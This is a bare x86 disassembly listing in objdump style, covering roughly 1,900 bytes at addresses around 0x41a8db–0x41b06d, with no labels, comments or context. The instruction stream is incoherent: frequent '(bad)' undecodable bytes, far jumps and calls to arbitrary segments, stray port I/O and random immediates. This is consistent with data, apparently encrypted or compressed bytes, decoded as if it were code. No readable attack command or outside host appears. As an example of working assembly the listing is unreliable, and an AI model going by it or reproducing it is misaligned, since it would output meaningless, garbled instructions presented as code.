  41a8db:	(bad)  
  41a8dc:	xchg   WORD PTR [ebx+esi*2],ax
  41a8e0:	stc    
  41a8e1:	test   eax,0x48eb866e
  41a8e6:	jno    0x41a8c1
  41a8e8:	mov    edi,0xa5306b5
  41a8ed:	inc    edx
  41a8ee:	sbb    ebx,0xffffffe3
  41a8f1:	icebp  
  41a8f2:	jae    0x41a939
  41a8f4:	int3   
  41a8f5:	push   0x6b
  41a8f7:	retf   0x4a9b
  41a8fa:	inc    eax
  41a8fb:	pusha  
  41a8fc:	daa    
  41a8fd:	arpl   WORD PTR [eax+0x8b37b21],bp
  41a903:	mov    eax,0x81c4e124
  41a908:	(bad)  
  41a909:	cmp    edi,DWORD PTR [eax-0x4e]
  41a90c:	sbb    DWORD PTR [esi-0x4b],0x7428c2f3
  41a913:	push   cs
  41a914:	push   ebp
  41a915:	pop    ds
  41a916:	jmp    0x495b:0x2a9dcbd3
  41a91d:	mov    ebx,0xe876a6fc
  41a922:	rol    BYTE PTR [ecx],0xc9
  41a925:	sub    al,0x8b
  41a927:	jecxz  0x41a8ea
  41a929:	aad    0xd
  41a92b:	mov    esi,0xd882aefc
  41a930:	(bad)  
  41a931:	fistp  DWORD PTR [edx]
  41a933:	outs   dx,BYTE PTR ds:[esi]
  41a934:	push   0xdff7b2b5
  41a939:	(bad)  [esi-0xc]
  41a93c:	inc    eax
  41a93d:	cwde   
  41a93e:	shl    esp,cl
  41a940:	or     DWORD PTR [edi],esp
  41a942:	jecxz  0x41a9c0
  41a944:	push   ebp
  41a945:	push   esi
  41a946:	je     0x41a9af
  41a948:	(bad)  
  41a949:	iret   
  41a94a:	sbb    cl,bh
  41a94c:	shl    esp,0x9d
  41a94f:	enter  0xa960,0xf6
  41a953:	adc    ecx,esi
  41a955:	dec    edi
  41a956:	arpl   WORD PTR [esi*1+0x5531289],bx
  41a95d:	outs   dx,DWORD PTR ds:[esi]
  41a95e:	sbb    al,0x30
  41a960:	push   ebp
  41a961:	mov    esp,0xd80ba521
  41a966:	cmp    al,0xce
  41a968:	push   esi
  41a969:	mov    ecx,0x9b4eac40
  41a96e:	mov    ebp,0x3f397436
  41a973:	xor    cl,BYTE PTR [edx-0x63]
  41a976:	dec    edx
  41a977:	cwde   
  41a978:	or     eax,0xdfd37c54
  41a97d:	pop    ebx
  41a97e:	dec    edi
  41a97f:	loopne 0x41a9a2
  41a981:	mov    bh,0x1
  41a983:	mov    BYTE PTR ds:0x97d3a591,bh
  41a989:	out    dx,eax
  41a98a:	aas    
  41a98b:	arpl   WORD PTR [ebp+0x3c],bp
  41a98e:	call   0xe2a2:0x683a28ff
  41a995:	sub    DWORD PTR [edi+0xe7fc2ab],0xffffffb3
  41a99c:	push   ecx
  41a99d:	mov    DWORD PTR [edi+edi*1],ebx
  41a9a0:	mov    ecx,0xf74af808
  41a9a5:	pushf  
  41a9a6:	mov    ds,WORD PTR [eax]
  41a9a8:	stos   BYTE PTR es:[edi],al
  41a9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9aa:	push   ss
  41a9ab:	gs jae 0x41a9a5
  41a9ae:	into   
  41a9af:	icebp  
  41a9b0:	repnz mov bh,0x1e
  41a9b3:	ror    BYTE PTR [ebx-0x7560dfee],0x14
  41a9ba:	jecxz  0x41a992
  41a9bc:	mov    cl,0xa1
  41a9be:	outs   dx,DWORD PTR ds:[esi]
  41a9bf:	lds    ebx,FWORD PTR [edi+0x78]
  41a9c2:	(bad)  
  41a9c3:	loope  0x41a9c2
  41a9c5:	mov    dl,0x5b
  41a9c7:	cmp    eax,0xe12bd226
  41a9cc:	push   edx
  41a9cd:	fwait
  41a9ce:	sbb    esi,edx
  41a9d0:	mov    ch,0xc8
  41a9d2:	inc    ebp
  41a9d3:	sub    esp,ecx
  41a9d5:	push   ds
  41a9d6:	pop    eax
  41a9d7:	ins    DWORD PTR es:[edi],dx
  41a9d8:	mov    al,ds:0xc9a0b17c
  41a9dd:	gs cwde 
  41a9df:	loope  0x41a9ad
  41a9e1:	adc    ebx,DWORD PTR [eax+esi*2-0x7fa9e31d]
  41a9e8:	inc    ebx
  41a9e9:	push   ebx
  41a9ea:	xor    BYTE PTR [edx+0x9c8388c],ah
  41a9f0:	push   ecx
  41a9f1:	mov    ebx,0xdd64de46
  41a9f6:	out    0x2b,eax
  41a9f8:	jmp    0x9a69:0x4e39151d
  41a9ff:	inc    edi
  41aa00:	enter  0xd7a0,0x64
  41aa04:	outs   dx,BYTE PTR ds:[esi]
  41aa05:	mov    ecx,gs
  41aa07:	jae    0x41aa85
  41aa09:	add    eax,0xd2c14c50
  41aa0e:	std    
  41aa0f:	ss das 
  41aa11:	imul   ebp,DWORD PTR [ecx+ebp*8+0x5e256cad],0x7c
  41aa19:	aam    0x81
  41aa1b:	mov    esp,0xd5f77bfd
  41aa20:	jge    0x41aa14
  41aa22:	pop    es
  41aa23:	and    ch,BYTE PTR [eax]
  41aa25:	add    BYTE PTR [ebx+edx*8],cl
  41aa28:	adc    cl,BYTE PTR ds:0x9d343c18
  41aa2e:	jmp    0xbc01:0x7384783f
  41aa35:	fdivp  st(1),st
  41aa37:	fwait
  41aa38:	in     al,dx
  41aa39:	and    eax,0x705927f6
  41aa3e:	xchg   esi,eax
  41aa3f:	fistp  WORD PTR [ecx]
  41aa41:	jno    0x41aab6
  41aa43:	pushf  
  41aa44:	lods   al,BYTE PTR ds:[esi]
  41aa45:	shl    DWORD PTR [ebx+0x66],0x81
  41aa49:	sbb    DWORD PTR ds:[ebx+0x58d39827],edi
  41aa50:	mov    ?,WORD PTR [ebx+0x5]
  41aa53:	mov    ss,ecx
  41aa55:	mov    BYTE PTR [eax-0xb9e4431],dl
  41aa5b:	mov    ebx,0xd23dbc7e
  41aa60:	(bad)  
  41aa61:	inc    esp
  41aa62:	ja     0x41aa61
  41aa64:	push   es
  41aa65:	pop    esi
  41aa66:	push   ss
  41aa67:	add    eax,0x6694caab
  41aa6c:	sub    DWORD PTR [edi],ebp
  41aa6e:	jns    0x41aad2
  41aa70:	mov    bh,0xec
  41aa72:	mov    ?,WORD PTR [edx-0x4c]
  41aa75:	sbb    BYTE PTR [ebx],ch
  41aa77:	inc    esp
  41aa78:	fisubr DWORD PTR [edx+edx*1-0x3275f8be]
  41aa7f:	xchg   BYTE PTR [ebx+eax*2],ch
  41aa82:	lods   eax,DWORD PTR ds:[esi]
  41aa83:	aad    0x6f
  41aa85:	leave  
  41aa86:	hlt    
  41aa87:	jmp    0x41aac5
  41aa89:	(bad)  
  41aa8a:	add    DWORD PTR es:[ebx+ebp*2+0x1a],ebp
  41aa8f:	pop    edx
  41aa90:	cld    
  41aa91:	dec    eax
  41aa92:	adc    al,0x61
  41aa94:	xchg   ecx,eax
  41aa95:	cld    
  41aa96:	retf   0x1fba
  41aa99:	mov    WORD PTR [edi+edx*2],es
  41aa9c:	cdq    
  41aa9d:	cdq    
  41aa9e:	dec    ecx
  41aa9f:	lods   al,BYTE PTR ds:[esi]
  41aaa0:	mov    bh,0xf6
  41aaa2:	and    ch,BYTE PTR [ecx]
  41aaa4:	ret    0xbbe5
  41aaa7:	cmp    ecx,DWORD PTR [edx+edx*2]
  41aaaa:	xchg   esp,eax
  41aaab:	or     DWORD PTR [edx+0x76],ebp
  41aaae:	arpl   WORD PTR [eax-0x37],sp
  41aab1:	sub    cl,dh
  41aab3:	and    eax,0x3c8ff179
  41aab8:	push   ds
  41aab9:	or     eax,0x605fc816
  41aabe:	icebp  
  41aabf:	fild   WORD PTR [ecx]
  41aac1:	call   0x5ac2:0x8037042b
  41aac8:	jno    0x41ab2c
  41aaca:	mov    dl,0x70
  41aacc:	inc    ebp
  41aacd:	dec    ebp
  41aace:	mul    DWORD PTR [ecx]
  41aad0:	retf   0x6235
  41aad3:	retf   0xbbea
  41aad6:	out    0xf4,al
  41aad8:	add    esp,DWORD PTR [ebx+0x471b4da6]
  41aade:	jnp    0x41aab5
  41aae0:	add    al,0x25
  41aae2:	jmp    0x3b38641
  41aae7:	(bad)
  41aaea:	cmp    ebp,ebp
  41aaec:	out    dx,eax
  41aaed:	ret    
  41aaee:	push   esp
  41aaef:	xor    ebx,ebp
  41aaf1:	pop    edx
  41aaf2:	mov    ebx,0xaf67017
  41aaf7:	push   ebx
  41aaf8:	pop    ss
  41aaf9:	mov    dh,0x29
  41aafb:	cmp    DWORD PTR [esi],ecx
  41aafd:	cmp    BYTE PTR [ebx+0x441fc0d0],cl
  41ab03:	xchg   edi,eax
  41ab04:	sub    BYTE PTR [esi],bh
  41ab06:	mov    bh,0x38
  41ab08:	and    BYTE PTR [edx],bh
  41ab0a:	(bad)  
  41ab0b:	sbb    eax,0x57e9029d
  41ab10:	lods   al,BYTE PTR ds:[esi]
  41ab11:	jmp    0x476fe81a
  41ab16:	int3   
  41ab17:	es cmp ecx,ebp
  41ab1a:	hlt    
  41ab1b:	mov    esi,DWORD PTR [esi-0x1b2b5a77]
  41ab21:	mov    ds:0x445115f8,al
  41ab26:	enter  0x6d50,0x68
  41ab2a:	out    dx,eax
  41ab2b:	call   0x8a52:0x89332d51
  41ab32:	dec    ebp
  41ab33:	aam    0x86
  41ab35:	mov    cs,edi
  41ab37:	mov    dh,0x77
  41ab39:	scas   eax,DWORD PTR es:[edi]
  41ab3a:	or     eax,0x1b37ea1d
  41ab3f:	inc    edi
  41ab40:	mov    dl,0x4d
  41ab42:	jmp    0xedf44a68
  41ab47:	sar    BYTE PTR [eax],cl
  41ab49:	not    BYTE PTR [esi+0x43]
  41ab4c:	(bad)  
  41ab4e:	int3   
  41ab4f:	push   ss
  41ab50:	arpl   bx,si
  41ab52:	xchg   ecx,eax
  41ab53:	and    BYTE PTR [esi],cl
  41ab55:	mov    ah,0xaf
  41ab57:	dec    esp
  41ab58:	jae    0x41ab08
  41ab5a:	loopne 0x41ab0b
  41ab5c:	xor    DWORD PTR [edx+0x1c694237],ecx
  41ab62:	inc    ebp
  41ab63:	mov    bh,0xf9
  41ab65:	scas   al,BYTE PTR es:[edi]
  41ab66:	in     al,0xc7
  41ab68:	add    al,0x69
  41ab6a:	jo     0x41ab2e
  41ab6c:	jmp    0x88dca5de
  41ab71:	mov    dl,BYTE PTR [edx+0x58]
  41ab74:	pop    esp
  41ab75:	sub    esi,DWORD PTR [ebp+0x7e]
  41ab78:	sbb    BYTE PTR [ebp-0x452b27d1],bh
  41ab7e:	jno    0x41ab24
  41ab80:	cmp    ch,BYTE PTR ds:[edi]
  41ab83:	dec    esp
  41ab84:	mov    ecx,eax
  41ab86:	ins    DWORD PTR es:[edi],dx
  41ab87:	dec    ecx
  41ab88:	test   al,0xc6
  41ab8a:	sbb    dh,BYTE PTR [edi+edx*1]
  41ab8d:	mov    dl,0xae
  41ab8f:	(bad)  
  41ab90:	xchg   di,ax
  41ab92:	jle    0x41abcc
  41ab94:	in     al,dx
  41ab95:	stc    
  41ab96:	es test eax,0xa8a19230
  41ab9c:	pop    esp
  41ab9d:	push   esi
  41ab9e:	lds    esi,FWORD PTR [edi-0x68]
  41aba1:	add    eax,0x597718b5
  41aba6:	push   eax
  41aba7:	fmulp  st(0),st
  41aba9:	sub    eax,0xf60959b6
  41abae:	mov    eax,0xa44894d2
  41abb3:	imul   edi,DWORD PTR [esi],0x1e2db150
  41abb9:	or     al,0xe5
  41abbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abbc:	pop    esi
  41abbd:	lea    edx,ds:0x40d4dc5b
  41abc3:	inc    edx
  41abc4:	mov    ch,0x73
  41abc6:	pushf  
  41abc7:	inc    edx
  41abc8:	adc    al,0x8
  41abca:	pop    ds
  41abcb:	inc    ebp
  41abcc:	repnz mov dh,0xb6
  41abcf:	dec    ebx
  41abd0:	xor    DWORD PTR [ebx],eax
  41abd2:	imul   esi,esp,0x1c70166a
  41abd8:	(bad)  
  41abda:	pushf  
  41abdb:	call   0x63204063
  41abe0:	add    DWORD PTR [ecx+ecx*1],edi
  41abe3:	loopne 0x41ac4f
  41abe5:	sub    DWORD PTR [ebx],edi
  41abe7:	fnsave [esi+eax*1+0x764e2102]
  41abee:	(bad)  
  41abef:	xchg   esi,eax
  41abf0:	aad    0x3d
  41abf2:	mov    BYTE PTR [ecx+ebx*8-0x2f6b9036],dh
  41abf9:	cmova  ebp,DWORD PTR [esi+0xf3ad54]
  41ac00:	mov    esp,0xfd572926
  41ac05:	clc    
  41ac06:	inc    BYTE PTR [eax]
  41ac08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac09:	and    BYTE PTR [eax-0x2a],0x83
  41ac0d:	mov    al,ds:0x3d11754
  41ac12:	sahf   
  41ac13:	add    eax,0xf2db8429
  41ac18:	xor    eax,DWORD PTR fs:[esi]
  41ac1b:	sub    cl,ch
  41ac1d:	nop
  41ac1e:	rcl    DWORD PTR [edi+edx*4+0x68],1
  41ac22:	lods   al,BYTE PTR ds:[esi]
  41ac23:	mov    bl,0xb0
  41ac25:	aam    0x40
  41ac27:	sub    DWORD PTR [ecx+0x6c],0xffffffe2
  41ac2b:	add    bh,cl
  41ac2d:	xchg   edx,eax
  41ac2e:	sar    al,cl
  41ac30:	dec    esp
  41ac31:	rol    DWORD PTR [ebp-0x25],0x19
  41ac35:	xchg   DWORD PTR [esi],edx
  41ac37:	adc    edi,ecx
  41ac39:	stos   BYTE PTR es:[edi],al
  41ac3a:	icebp  
  41ac3b:	xchg   ebp,eax
  41ac3c:	pop    esp
  41ac3d:	mov    edi,0x3f34a53b
  41ac42:	push   edi
  41ac43:	jmp    0x41ac3a
  41ac45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac46:	test   BYTE PTR [esi+edi*1-0x6bda3ba2],al
  41ac4d:	fwait
  41ac4e:	xchg   esi,eax
  41ac4f:	js     0x41accd
  41ac51:	fcomp  DWORD PTR [edx]
  41ac53:	jecxz  0x41abfa
  41ac55:	xor    eax,0x65df2abf
  41ac5a:	pop    edx
  41ac5b:	retf   0x98b9
  41ac5e:	into   
  41ac5f:	sbb    BYTE PTR [edx],ah
  41ac61:	add    dl,BYTE PTR [edi-0x25]
  41ac64:	call   0x59e1:0x1c59967f
  41ac6b:	je     0x41ac2c
  41ac6d:	rcr    BYTE PTR [esi-0x482725e5],cl
  41ac73:	adc    eax,ebp
  41ac75:	lahf   
  41ac76:	and    DWORD PTR [edx-0x6eb91c00],ebx
  41ac7c:	nop
  41ac7d:	jle    0x41acda
  41ac7f:	push   ebx
  41ac80:	call   DWORD PTR [eax-0x49]
  41ac83:	sub    ah,al
  41ac85:	xor    eax,0xa53957c7
  41ac8a:	and    eax,0x1aca26e1
  41ac8f:	les    esi,FWORD PTR [ecx]
  41ac91:	in     al,0x70
  41ac93:	pop    ds
  41ac94:	mov    edx,0x392a1d20
  41ac99:	xor    DWORD PTR [ebx+0x3a],ecx
  41ac9c:	mov    ebp,edx
  41ac9e:	add    esi,DWORD PTR [edx+0xcc6d57a]
  41aca4:	and    edx,0xbf87ae9b
  41acaa:	xor    al,0x33
  41acac:	stos   DWORD PTR es:[edi],eax
  41acad:	fsubr  QWORD PTR [ecx+0x1e]
  41acb0:	ror    BYTE PTR [edi],cl
  41acb2:	retf   0x1557
  41acb5:	dec    ecx
  41acb6:	dec    esi
  41acb7:	push   eax
  41acb8:	sbb    dh,BYTE PTR [edi+0x22bebf96]
  41acbe:	aas    
  41acbf:	jmp    0x57c774d5
  41acc4:	loop   0x41acf7
  41acc6:	xor    BYTE PTR [esi-0x69],cl
  41acc9:	mov    ecx,0xe8a52485
  41acce:	std    
  41accf:	lods   al,BYTE PTR ds:[esi]
  41acd0:	mov    eax,ds:0xeb55476e
  41acd5:	(bad)  
  41acd6:	aad    0x26
  41acd8:	inc    esp
  41acd9:	sub    eax,0x3f75992f
  41acde:	cld    
  41acdf:	inc    ecx
  41ace0:	imul   edx,DWORD PTR [edx+0x57],0xbf04e041
  41ace7:	mov    ecx,0x65c72476
  41acec:	mov    ah,0x47
  41acee:	push   ecx
  41acef:	dec    ecx
  41acf0:	daa    
  41acf1:	cmp    BYTE PTR [esi],0xdd
  41acf4:	das    
  41acf5:	(bad)  
  41acf6:	xchg   ebp,eax
  41acf7:	push   es
  41acf8:	mov    bl,BYTE PTR [esi-0x3a6c69ca]
  41acfe:	pop    edx
  41acff:	dec    edx
  41ad00:	push   0xe82dcaba
  41ad05:	lock lock mov al,ds:0xc28f412c
  41ad0c:	repz mov ebp,0x54e4ccc8
  41ad12:	out    0x68,al
  41ad14:	mov    eax,ds:0xa932ce31
  41ad19:	inc    edi
  41ad1a:	mov    ss,WORD PTR [edi-0x6705d1f7]
  41ad20:	xchg   esi,eax
  41ad21:	pop    ss
  41ad22:	sbb    eax,0x10a14e09
  41ad27:	mov    edi,0x377ae65
  41ad2c:	add    BYTE PTR [ecx+eiz*1],ah
  41ad2f:	inc    edx
  41ad30:	pushf  
  41ad31:	ret    0xbd03
  41ad34:	and    BYTE PTR [esi-0x10],dh
  41ad37:	jmp    0xcba6:0xc5c10d9e
  41ad3e:	daa    
  41ad3f:	dec    edi
  41ad40:	mov    bl,0x1f
  41ad42:	js     0x41ad29
  41ad44:	fistp  DWORD PTR [eax]
  41ad46:	adc    edx,DWORD PTR [edi+eiz*4]
  41ad49:	adc    esi,0xbf6b4282
  41ad4f:	call   0x4600:0xf31e518f
  41ad56:	cld    
  41ad57:	push   ebx
  41ad58:	mov    al,0x1e
  41ad5a:	or     bl,bh
  41ad5c:	dec    esi
  41ad5d:	aas    
  41ad5e:	lods   al,BYTE PTR ds:[esi]
  41ad5f:	fadd   DWORD PTR [esi+0x44abbfad]
  41ad65:	mov    ?,edx
  41ad67:	xchg   ecx,eax
  41ad68:	xlat   BYTE PTR ds:[ebx]
  41ad69:	xor    esp,DWORD PTR [edi]
  41ad6b:	loop   0x41ad76
  41ad6d:	mov    bh,0x7
  41ad6f:	test   al,0x57
  41ad71:	adc    eax,0xa521ef53
  41ad76:	mov    ebx,0xd905c10f
  41ad7b:	repnz loop 0x41ad63
  41ad7e:	xchg   esp,eax
  41ad7f:	inc    ecx
  41ad80:	in     al,0x95
  41ad82:	cwde   
  41ad83:	pop    edi
  41ad84:	scas   al,BYTE PTR es:[edi]
  41ad85:	inc    ebx
  41ad86:	cwde   
  41ad87:	cwde   
  41ad88:	shl    BYTE PTR [eax-0x6c3c1ae9],0xb9
  41ad8f:	xor    ah,BYTE PTR [esi]
  41ad91:	mov    al,ds:0xe7b09cfb
  41ad96:	or     DWORD PTR [edx-0x5b],0xcf2cde19
  41ad9d:	sbb    BYTE PTR [edi-0x6b],bh
  41ada0:	cmp    eax,0x7ef68514
  41ada5:	or     edx,0x6a
  41ada8:	and    al,0x20
  41adab:	push   ecx
  41adac:	popa   
  41adad:	and    eax,0x99867a53
  41adb2:	adc    edx,ebp
  41adb4:	sbb    dh,bh
  41adb6:	fcomp  DWORD PTR [esi-0x28e8538b]
  41adbc:	imul   ebx,DWORD PTR [esi],0xb18798ad
  41adc2:	sub    bh,BYTE PTR [eax-0x509fdded]
  41adc8:	enter  0xc9e8,0xa0
  41adcc:	jle    0x41ad97
  41adce:	retf   
  41adcf:	es sbb eax,0xb6527d10
  41add5:	sbb    esi,DWORD PTR fs:[ebx-0x6a45918c]
  41addc:	sahf   
  41addd:	xchg   DWORD PTR [esi-0x40],edi
  41ade0:	cmp    eax,0x112d04ed
  41ade5:	ins    BYTE PTR es:[edi],dx
  41ade6:	iret   
  41ade7:	inc    ebx
  41ade8:	push   es
  41ade9:	clc    
  41adea:	add    ebp,eax
  41adec:	push   ss
  41aded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adee:	fbstp  TBYTE PTR [edi]
  41adf0:	jmp    0x466:0x4475793d
  41adf7:	(bad)  
  41adf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adfa:	pop    esp
  41adfb:	lock push esi
  41adfd:	ret    0x51e5
  41ae00:	lock inc edx
  41ae02:	es push ecx
  41ae04:	sbb    eax,0x6fe8e0a3
  41ae09:	int3   
  41ae0a:	add    eax,0xa42c0ea9
  41ae0f:	stos   BYTE PTR es:[edi],al
  41ae10:	enter  0xbfa7,0xe0
  41ae14:	ret    0x7b2d
  41ae17:	push   esi
  41ae18:	cmp    dh,ah
  41ae1a:	nop
  41ae1b:	adc    BYTE PTR [esi+ecx*2],dl
  41ae1e:	test   eax,0x597788b4
  41ae23:	push   ecx
  41ae24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae25:	std    
  41ae26:	jge    0x41ae42
  41ae28:	test   DWORD PTR [ecx],edx
  41ae2a:	fs inc edi
  41ae2c:	fs fcmove st,st(6)
  41ae2f:	xor    esi,DWORD PTR [esi]
  41ae31:	ins    BYTE PTR es:[edi],dx
  41ae32:	push   esi
  41ae33:	ins    DWORD PTR es:[edi],dx
  41ae34:	mov    gs,WORD PTR [ecx-0x7b69f039]
  41ae3a:	scas   eax,DWORD PTR es:[edi]
  41ae3b:	mov    edx,gs
  41ae3d:	adc    esp,edx
  41ae3f:	aad    0x8b
  41ae41:	cmp    DWORD PTR [esi+0x74a87573],0x82a90d05
  41ae4b:	das    
  41ae4c:	shl    BYTE PTR [ebp+edx*2-0x71],1
  41ae50:	cdq    
  41ae51:	push   0x47
  41ae53:	leave  
  41ae54:	cmp    ecx,esi
  41ae56:	xor    ch,ch
  41ae58:	out    dx,al
  41ae59:	sbb    DWORD PTR [ebp+0x7d],esi
  41ae5c:	pop    ebx
  41ae5d:	xchg   ebx,eax
  41ae5e:	xor    ah,BYTE PTR [eax-0x76bdeb1f]
  41ae64:	ss push edi
  41ae66:	nop
  41ae67:	push   edx
  41ae68:	out    0x22,eax
  41ae6a:	push   esi
  41ae6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae6c:	daa    
  41ae6d:	mov    dh,0xfb
  41ae6f:	sub    eax,0xfae8ce9d
  41ae74:	push   bp
  41ae76:	lods   al,BYTE PTR ds:[esi]
  41ae77:	jmp    0x41aee9
  41ae79:	sbb    BYTE PTR [esi-0x2360829f],ah
  41ae7f:	loop   0x41ae15
  41ae81:	(bad)  
  41ae82:	mov    al,ds:0xdfc3456
  41ae87:	mov    esi,0xfde09aac
  41ae8c:	jmp    0xfdd9bc9e
  41ae91:	pop    es
  41ae92:	sbb    DWORD PTR ds:0x47840ba,ebx
  41ae98:	jbe    0x41ae26
  41ae9a:	mov    al,ds:0xfe0d3e9e
  41ae9f:	es and eax,0xabdc23c2
  41aea5:	clc    
  41aea6:	mov    al,0x49
  41aea8:	cmp    eax,0xd94e744a
  41aead:	les    esp,FWORD PTR [edx-0x29]
  41aeb0:	pop    ecx
  41aeb1:	xchg   BYTE PTR [esi],bl
  41aeb3:	mov    ah,0xd6
  41aeb5:	es pop es
  41aeb7:	addr16 dec esp
  41aeb9:	rep lods al,BYTE PTR ds:[esi]
  41aebb:	xor    cl,BYTE PTR [ecx]
  41aebd:	cwde   
  41aebe:	adc    BYTE PTR [eax-0x3b135695],bl
  41aec4:	out    0xcf,eax
  41aec6:	lock jno 0x41aeb1
  41aec9:	adc    BYTE PTR [ecx+eax*4+0x6783f112],ch
  41aed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aed1:	outs   dx,DWORD PTR ds:[esi]
  41aed2:	(bad)  
  41aed3:	or     eax,0xf08802c8
  41aed8:	push   0xffffffa8
  41aeda:	pop    esi
  41aedb:	adc    eax,0x63b9555a
  41aee0:	cbw    
  41aee2:	imul   ebp,DWORD PTR [ecx-0x104270b1],0xd0aa84aa
  41aeec:	jp     0x41ae90
  41aeee:	cld    
  41aeef:	inc    esp
  41aef0:	frstor ds:0x605f7773
  41aef6:	adc    DWORD PTR [edx+eiz*1+0x1e],eax
  41aefa:	mov    ds:0x287c3907,al
  41aeff:	and    dl,dh
  41af01:	xchg   edi,eax
  41af02:	fs pop ebx
  41af04:	jno    0x41aed4
  41af06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af07:	jae    0x41ae99
  41af09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af0a:	loope  0x41af6c
  41af0c:	arpl   WORD PTR [eax],bp
  41af0e:	scas   al,BYTE PTR es:[edi]
  41af0f:	adc    ah,0x85
  41af12:	add    al,0x7c
  41af14:	mov    ecx,0xf6ce562
  41af19:	out    0xcc,eax
  41af1b:	rcl    BYTE PTR [ebx],0xba
  41af1e:	(bad)  
  41af1f:	push   ebp
  41af20:	(bad)  [ecx]
  41af22:	pop    es
  41af23:	int3   
  41af24:	pop    ebx
  41af25:	mov    dh,0xdd
  41af27:	jbe    0x41af87
  41af29:	in     eax,dx
  41af2a:	lahf   
  41af2b:	arpl   WORD PTR [ebp+0x6912a7b4],si
  41af31:	xchg   esp,eax
  41af32:	aaa    
  41af33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af34:	(bad)  
  41af35:	xchg   ebp,eax
  41af36:	mov    BYTE PTR [eax+0x32],ah
  41af39:	mov    esi,0xfcdf28b5
  41af3e:	add    BYTE PTR [ebp+0x18],bh
  41af41:	ins    DWORD PTR es:[edi],dx
  41af42:	push   ecx
  41af43:	fisub  DWORD PTR [edx]
  41af45:	push   esi
  41af46:	sbb    eax,0x35cf9d1a
  41af4b:	hlt    
  41af4c:	cli    
  41af4d:	and    DWORD PTR [ecx-0x6ad020ab],0xedd40e97
  41af57:	dec    ebx
  41af58:	add    DWORD PTR [ecx-0x79],ebp
  41af5b:	inc    esi
  41af5c:	mov    edx,0x38568a9e
  41af61:	(bad)  
  41af62:	(bad)  
  41af63:	xchg   ebx,eax
  41af64:	test   eax,0xc78214ad
  41af69:	popf   
  41af6a:	jp     0x41afb3
  41af6c:	scas   eax,DWORD PTR es:[edi]
  41af6d:	cwde   
  41af6e:	mov    ds:0x38aac50,al
  41af73:	adc    BYTE PTR [ebp-0x157a1316],al
  41af79:	mov    ds:0x51760571,eax
  41af7e:	fwait
  41af7f:	call   0x8d29a8fb
  41af84:	cmp    cl,BYTE PTR ds:0x15e62a6d
  41af8a:	inc    esi
  41af8b:	aad    0x80
  41af8d:	push   ecx
  41af8e:	fnstcw WORD PTR [edi-0x43]
  41af91:	ret    
  41af92:	xor    DWORD PTR [ebx-0x6],ebx
  41af95:	or     BYTE PTR [ecx+ecx*2-0x248cb113],ah
  41af9c:	gs sbb bh,dh
  41af9f:	adc    esp,DWORD PTR [edx+0x41]
  41afa2:	sbb    DWORD PTR [ebx+0x5d],esi
  41afa5:	pop    ecx
  41afa6:	fadd   st(2),st
  41afa8:	push   edx
  41afa9:	rol    BYTE PTR [ecx+0x7a41cd37],cl
  41afaf:	sub    eax,0x6ecc3f9a
  41afb4:	enter  0xdf74,0x37
  41afb8:	stc    
  41afb9:	mov    al,ds:0xb1a8c0c6
  41afbe:	bound  eax,QWORD PTR [ecx+0x46]
  41afc1:	dec    eax
  41afc2:	cld    
  41afc3:	retf   0x3238
  41afc6:	int    0x83
  41afc8:	sub    DWORD PTR ds:[edi-0x35],edi
  41afcc:	adc    DWORD PTR [edx+0x0],edx
  41afcf:	mov    edi,0x99474532
  41afd4:	outs   dx,DWORD PTR ds:[esi]
  41afd5:	mov    ebx,0xfcee67ee
  41afda:	ret    
  41afdb:	into   
  41afdc:	outs   dx,WORD PTR ds:[esi]
  41afde:	xlat   BYTE PTR ds:[ebx]
  41afdf:	sub    ebx,ebx
  41afe1:	adc    bl,BYTE PTR [edx+ebx*2-0x31e130fc]
  41afe8:	add    al,0x40
  41afea:	inc    ebx
  41afeb:	shr    DWORD PTR [ebx+0x58],cl
  41afee:	or     al,0x91
  41aff0:	pop    ss
  41aff1:	cdq    
  41aff2:	jge    0x41b060
  41aff4:	outs   dx,BYTE PTR ds:[esi]
  41aff5:	add    ecx,ecx
  41aff7:	dec    BYTE PTR [esi-0x2b378b6d]
  41affd:	sbb    DWORD PTR [ebx-0x2],esi
  41b000:	dec    eax
  41b001:	stos   DWORD PTR es:[edi],eax
  41b002:	retf   
  41b003:	inc    ecx
  41b004:	ins    BYTE PTR es:[edi],dx
  41b005:	sbb    DWORD PTR [ebp-0x33ce7b2f],edi
  41b00b:	mov    al,0xc7
  41b00d:	(bad)  [ecx+0x474b124f]
  41b013:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41b015:	add    al,0xa4
  41b017:	fsub   st,st(4)
  41b019:	dec    esi
  41b01a:	std    
  41b01b:	imul   cl
  41b01d:	(bad)  
  41b01e:	fsubr  QWORD PTR [edi+0x58]
  41b021:	add    bl,BYTE PTR [ebx-0x2893bfb3]
  41b027:	push   edx
  41b028:	or     esi,ebp
  41b02a:	fistp  WORD PTR [edx+0x68829a6]
  41b030:	addr16 (bad) 
  41b032:	fwait
  41b033:	xchg   esp,eax
  41b034:	popa   
  41b035:	call   0xb03:0x1ea63cf5
  41b03c:	(bad)  
  41b03e:	je     0x41b004
  41b040:	mov    dl,BYTE PTR [edx]
  41b042:	inc    ebp
  41b043:	icebp  
  41b044:	cmp    al,ah
  41b046:	test   DWORD PTR [ecx-0x52],edi
  41b049:	lea    esi,[esi]
  41b04b:	ins    BYTE PTR es:[edi],dx
  41b04c:	imul   edx,DWORD PTR [edx+esi*1+0x54e0243f],0x21
  41b054:	out    dx,al
  41b055:	nop
  41b056:	stos   DWORD PTR es:[edi],eax
  41b057:	out    dx,al
  41b058:	or     al,0xc1
  41b05a:	mov    dl,BYTE PTR [ebp-0x50]
  41b05d:	and    ecx,DWORD PTR ds:0x95a7f51e
  41b063:	jnp    0x41b032
  41b065:	dec    edi
  41b066:	icebp  
  41b067:	shl    DWORD PTR ds:0x257394a6,1
  41b06d:	xchg   edi,eax
